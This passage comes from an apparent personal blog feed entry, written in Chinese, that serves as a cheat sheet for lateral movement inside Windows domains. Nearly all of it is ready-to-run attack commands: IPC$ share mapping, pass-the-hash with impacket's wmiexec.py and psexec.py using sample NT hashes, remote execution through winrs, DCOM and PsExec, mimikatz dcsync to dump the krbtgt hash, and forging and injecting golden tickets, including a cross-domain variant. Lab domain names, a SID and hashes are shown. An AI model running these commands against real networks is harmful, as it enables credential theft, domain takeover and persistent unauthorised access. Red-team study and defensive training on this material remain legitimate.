c:\result.txt&quot;</span><br><span class="line"></span><br><span class="line">type \\192.168.xxx.xxx\c$\result.txt</span><br></pre></td></tr></table></figure><p>wmic+hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">impacket中的wmiexec.py使用：</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code> python wmiexec.py 用户名:密码@目标IP                                  #获得交互式shellpython wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP           #hash传递python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP &quot;ipconfig&quot; </code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">还有vbs，powershell方式</span><br><span class="line"></span><br><span class="line"># WinRm服务</span><br><span class="line"></span><br><span class="line">前言：</span><br><span class="line"></span><br><span class="line">Windows 远程管理(WinRM)是 WS-Management 协议的 Microsoft 实现，该协议为使用 Web 服务的本地计算机和远程计算机之间的通信提供了一种安全的方式。</span><br><span class="line"></span><br><span class="line">WinRM 默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证，初始身份验证后，WinRM 会话将使用 AES 加密保护。使用 WinRM 服务需要拥有管理员级别的权限。</span><br><span class="line"></span><br><span class="line"> WinRM HTTP 通过 TCP 端口 5985 进行通信，启动 WinRM 服务后，防火墙默认会自动放行 5985 端口。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用：</span><br><span class="line"></span><br><span class="line">winrs</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>winrs -r:<a href="http://ip:5985/">http://ip:5985</a> -u:[username] -p:[password] <command></p><p>winrs -r:<a href="http://dc1.god.loal:5985/">http://dc1.god.loal:5985</a> -u:[username] -p:[password] <command>   #域中指定远程主机机器名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># dcom</span><br><span class="line"></span><br><span class="line">DCOM（分布式组件对象模型）是微软的一系列概念和程序接口</span><br><span class="line"></span><br><span class="line">Impacket 的dcomexec.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python dcomexec.py shmily.god/Administrator:<a href="mailto:&#49;&#x32;&#x33;&#x34;&#x35;&#x36;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#49;&#57;&#x2e;&#49;&#48;&#48;">&#49;&#x32;&#x33;&#x34;&#x35;&#x36;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#49;&#57;&#x2e;&#49;&#48;&#48;</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># PTH</span><br><span class="line"></span><br><span class="line">基于NTML hash认证  (windows认证方式)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PsExec64.exe  无ipc只能用账户密码</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PsExec64.exe \10.10.3.6 -u “shmily.god/Administrator” -p 123456 -s cmd.exe </p><p>#-u 域\用户名  -p 密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">psexec.py </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cd243e1e171da2c4edd1dd695bfbef5a shmily.god/Administrator@192.168.119.100</p><p>python3 psexec.py shmily.god/administrator:admin123…!@192.168.119.100</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># PTT</span><br><span class="line"></span><br><span class="line">通常用来域内&#96;权限维持&#96;</span><br><span class="line"></span><br><span class="line">### Golden Ticket</span><br><span class="line"></span><br><span class="line">![image-20220307225058167](内网横向渗透&#x2F;image-20220307225058167.png)</span><br><span class="line"></span><br><span class="line">krbtgt 是kdc服务使用账户，在Domain Admins组中，域环境中，用户账户的票据都是krbtgt生成的。</span><br><span class="line"></span><br><span class="line">如果攻击者拿到了 krbtgt的ntml hash或者AES-256值，&#96;即可伪造任意用户身份&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">需要条件：</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>需要伪造的域用户名（有域管，肯定伪造域管啦）</p></li><li><p>该域的域名</p></li><li><p>krbtgt的ntml hash或者AES-256值</p></li><li><p>域krbtgt  SID (去掉-502)     （wmic useraccount get name,sid）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">获得krbtgt账号的SID值和ntml hash哈希值     [这个需要我们用域账户（权限太低不行，即域管权限），并且将该用户加入本地管理员组，或者用域管理员方式进行cmd命令执行]</span><br><span class="line"></span><br><span class="line">1. 获得hash等需要的条件信息</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mimikatz.exe “privilege::debug” “lsadump::dcsync /domain:shmily.god /user:krbtgt”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220307225230207](内网横向渗透&#x2F;image-20220307225230207.png)</span><br><span class="line"></span><br><span class="line">![image-20220307225631024](内网横向渗透&#x2F;image-20220307225631024.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SID        :S-1-5-21-2538459943-234226500-22795540782<br>ntml hash  :8aecb1498df128a866968668302003bd<br>aes256     :1f15a3cce65909ed19ff0e5ec6b7102f630be3725b12c66e25251ab0b81305e7 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 查询域管理员账号：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>net group “domain admins” /domain</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308000619676](内网横向渗透&#x2F;image-20220308000619676.png)</span><br><span class="line"></span><br><span class="line">注入票据前</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>dir \192.168.119.200\c$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308004612176](内网横向渗透&#x2F;image-20220308004612176.png)</span><br><span class="line"></span><br><span class="line">3. 清空会话票据</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>privilege::debug<br>kerberos::purge</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308001049876](内网横向渗透&#x2F;image-20220308001049876.png)</span><br><span class="line"></span><br><span class="line">4. 生成黄金票据(Administrator.kiribi)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kerberos::golden /user:administrator /domain:shmily.god /sid:S-1-5-21-2538459943-234226500-22795540782 /krbtgt:8aecb1498df128a866968668302003bd /ticket:Administrator.kiribi</p></li></ol><h1 id="kerberos-golden-user-要伪造的域用户-我们这一般写域管理员-domain-域名-sid-域的sid值-krbtgt-krbtgt的哈希-ptt"><a href="#kerberos-golden-user-要伪造的域用户-我们这一般写域管理员-domain-域名-sid-域的sid值-krbtgt-krbtgt的哈希-ptt" class="headerlink" title="kerberos::golden /user:要伪造的域用户(我们这一般写域管理员) /domain:域名 /sid:域的sid值 /krbtgt:krbtgt的哈希 /ptt"></a>kerberos::golden /user:要伪造的域用户(我们这一般写域管理员) /domain:域名 /sid:域的sid值 /krbtgt:krbtgt的哈希 /ptt</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308002554785](内网横向渗透&#x2F;image-20220308002554785.png)</span><br><span class="line"></span><br><span class="line">5. 注入票据</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kerberos::ptt Administrator.kiribi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308002722245](内网横向渗透&#x2F;image-20220308002722245.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kerberos::tgt  查看当前票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308002904106](内网横向渗透&#x2F;image-20220308002904106.png)</span><br><span class="line"></span><br><span class="line">6. 验证</span><br><span class="line"></span><br><span class="line">![image-20220308003825467](内网横向渗透&#x2F;image-20220308003825467.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用黄金票据伪造的用户可以是任意用户（即使这个用户不存在），因为 TGT 的加密是由 krbtgt 完成的，所以只要 TGT 被 krbtgt 账户和密码正确的加密，那么任意 KDC 使用 krbtgt 将 TGT 解密后，TGT 中的所有信息都是可信的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Silver Ticket</span><br><span class="line"></span><br><span class="line">![image-20220307220404812](内网横向渗透&#x2F;image-20220307220404812.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### EnhancedGolden Tickets</span><br><span class="line"></span><br><span class="line">参考：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;system&#x2F;197160.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过域内主机在迁移时&#96;LDAP库&#96;中的&#96;SIDHistory&#96;属性中保存的&#96;上一个域&#96;的&#96;SID值&#96;制作可以跨域的金票。</span><br><span class="line"></span><br><span class="line">如果知道根域的SID那么就可以&#96;通过子域&#96;的KRBTGT的&#96;HASH&#96;值，使用mimikatz创建具有 EnterpriseAdmins组权限（域林中的最高权限）的票据。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kerberos::golden /admin:administrator /domain:news.yunying.lab /sid:XXX /sids:XXX /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt</p><pre><code>Startoffset和endin分别代表偏移量和长度，renewmax表示生成的票据的最长时间这使用的是子域krbtgt的 hash，根域的不知道。参考：渗透攻击红队公众号[内网渗透（四） | 票据传递攻击 - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1653877)</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;不断更新&lt;/p&gt;
&lt;p&gt;配合impacket工具使用&lt;/p&gt;
&lt;h1 id=&quot;IPC&quot;&gt;&lt;a href=&quot;#IPC&quot; class=&quot;headerlink&quot; title=&quot;IPC$&quot;&gt;&lt;/a&gt;IPC$&lt;/h1&gt;&lt;p&gt;IPC$(Internet Process Connection)是共享”命名管道”的资源，是为了让进程间通信而开放的命名管道&lt;/p&gt;
&lt;p&gt;利用条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;开放139,445端口&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;net share   显示所有共享资源&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net use \\ip\ipc$ &amp;quot;密码&amp;quot; &amp;#x2F;user:&amp;quot;用户名&amp;quot; 建立ipc非空连接&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net use h: \\ip\c$     将对方c 映射到本地h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net use \\ip\c$ &amp;#x2F;del   如果断开连接就删除重新连接就行&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="内网" scheme="http://example.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网横向渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
